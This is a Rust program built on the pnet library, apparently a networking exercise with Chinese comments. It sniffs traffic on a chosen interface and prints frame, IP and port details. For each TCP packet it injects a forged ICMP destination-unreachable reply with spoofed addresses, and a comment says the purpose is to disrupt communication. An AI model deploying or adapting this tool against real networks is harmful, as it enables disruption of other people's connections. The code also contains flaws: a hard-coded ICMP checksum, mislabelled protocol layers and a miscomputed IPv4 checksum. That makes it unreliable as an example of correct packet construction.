use pnet::datalink::{self, NetworkInterface};
use pnet::datalink::Channel::Ethernet;
use pnet::packet::{Packet};
use pnet::packet::ethernet::{EthernetPacket,MutableEthernetPacket,EtherTypes};
use pnet::packet::ipv4::{Ipv4Packet,MutableIpv4Packet};
use pnet::packet::tcp::TcpPacket;
use pnet::packet::icmp::{IcmpType,IcmpCode};
use pnet::packet::icmp::destination_unreachable::MutableDestinationUnreachablePacket;

use std::env;

// 读入环境变量：网卡标号
fn main() {
    let interface_name = env::args().nth(1).unwrap();// 从命令行参数中获取网络接口的名称
    let interface_names_match =
        |iface: &NetworkInterface| iface.name == interface_name;// 定义一个闭包，用于检查接口名称是否与命令行参数中指定的名称匹配

    // 寻找可用网卡
    let interfaces = datalink::interfaces();// 获取系统中所有的网络接口列表

    let interface = interfaces.into_iter()
                              .filter(interface_names_match)
                              .next()
                              .unwrap();// 使用迭代器和闭包，过滤出匹配命令行参数中指定名称的接口，并获取第一个匹配的接口

    // 创建链路层隧道，解析链路层以太网包
    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),   //tx为发送，rx为接收
        Ok(_) => panic!("Unhandled channel type"),
        Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
    };

    loop {
        match rx.next() {
            Ok(packet) => {
                let ethernet_packet = EthernetPacket::new(packet).unwrap();
                let source_mac = ethernet_packet.get_source();
                let destination_mac = ethernet_packet.get_destination();
                println!("Layer 4: Ethernet");
                println!("Source MAC: {:?}", source_mac);
                println!("Destination MAC: {:?}", destination_mac);

                // 检查链路层载荷是否是IPv4数据包
                if ethernet_packet.get_ethertype() == pnet::packet::ethernet::EtherTypes::Ipv4 {
                    if let Some(ipv4_packet) = Ipv4Packet::new(ethernet_packet.payload()) {
                        // 解析IPv4数据包
                        let source_ip = ipv4_packet.get_source();
                        let destination_ip = ipv4_packet.get_destination();
                        println!("Layer 3: Ipv4");
                        println!("Source IP: {:?}", source_ip);
                        println!("Destination IP: {:?}", destination_ip);

                        // 检查运输层载荷是否是TCP数据包
                        if ipv4_packet.get_next_level_protocol() == pnet::packet::ip::IpNextHeaderProtocols::Tcp {
                            if let Some(tcp_packet) = TcpPacket::new(ipv4_packet.payload()) {
                                // 解析TCP数据包
                                let source_port = tcp_packet.get_source();
                                let destination_port = tcp_packet.get_destination();
                                println!("Layer 2: TCP");
                                println!("Source Port: {:?}", source_port);
                                println!("Destination Port: {:?}", destination_port);

                                // 若确定是TCP包，我要发送差错报告报文,以试图干扰通信
                                send_icmp_unreachable(&mut tx, destination_ip, source_ip, destination_mac, source_mac);
                            }
                        }

                        // 忽略其它运输层包
                    }
                }
                println!("\n");

                // 忽略IPv6数据包
            },
            Err(e) => {
                // If an error occurs, we can handle it here
                panic!("An error occurred while reading: {}", e);
            }
        }
    }
}

// 发送链路层包的函数
fn send_icmp_unreachable(
    tx: &mut Box<dyn datalink::DataLinkSender>, //链路层隧道发送端指针
    source_ip: std::net::Ipv4Addr,
    destination_ip: std::net::Ipv4Addr,
    source_mac: pnet::util::MacAddr,
    destination_mac: pnet::util::MacAddr,
) {
    // 创建ICMP包 (差错报告)
    let mut icmp_buffer = vec![0u8; 8];
    let mut icmp_packet = MutableDestinationUnreachablePacket::new(&mut icmp_buffer).unwrap();
    // 设置差错报告参数
    icmp_packet.set_icmp_type(IcmpType(3));
    icmp_packet.set_icmp_code(IcmpCode(2));
    // 计算校验和
    icmp_packet.set_checksum(icmp_packet.get_checksum());
    icmp_packet.set_checksum(0xfcfe);

    // 创建IPv4包
    let mut ipv4_buffer = vec![0u8; 28];
    let mut ipv4_packet = MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();
    // 设IPv4包参数，设置载荷为icmp包
    ipv4_packet.set_version(4);
    ipv4_packet.set_source(source_ip);
    ipv4_packet.set_destination(destination_ip);
    ipv4_packet.set_next_level_protocol
    (pnet::packet::ip::IpNextHeaderProtocols::Icmp);
    ipv4_packet.set_ttl(64);
    ipv4_packet.set_header_length(5);
    ipv4_packet.set_total_length(20+8);
    ipv4_packet.set_payload(icmp_packet.packet());
    // 计算校验和
    ipv4_packet.set_checksum(ipv4_packet.get_checksum());

    // 创建Ethernet包
    let mut ethernet_buffer = vec![0u8; 64];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
    // 设置源MAC和目的MAC地址，设置载荷为ipv4包
    ethernet_packet.set_ethertype(EtherTypes::Ipv4);
    ethernet_packet.set_source(source_mac);
    ethernet_packet.set_destination(destination_mac);
    ethernet_packet.set_payload(ipv4_packet.packet());

    // 发送包
    match tx.send_to(ethernet_packet.packet(), None) {
    Some(Ok(_bytes_sent)) => {
        println!("Successfully sent 1 icmp packet");
        println!("Sent Packet: {:?}", ethernet_packet.packet());
    }
    Some(Err(error)) => {
        eprintln!("Error sending packet: {:?}", error);
    }
    None => {
        eprintln!("Error: No bytes sent.");
    }
}
}
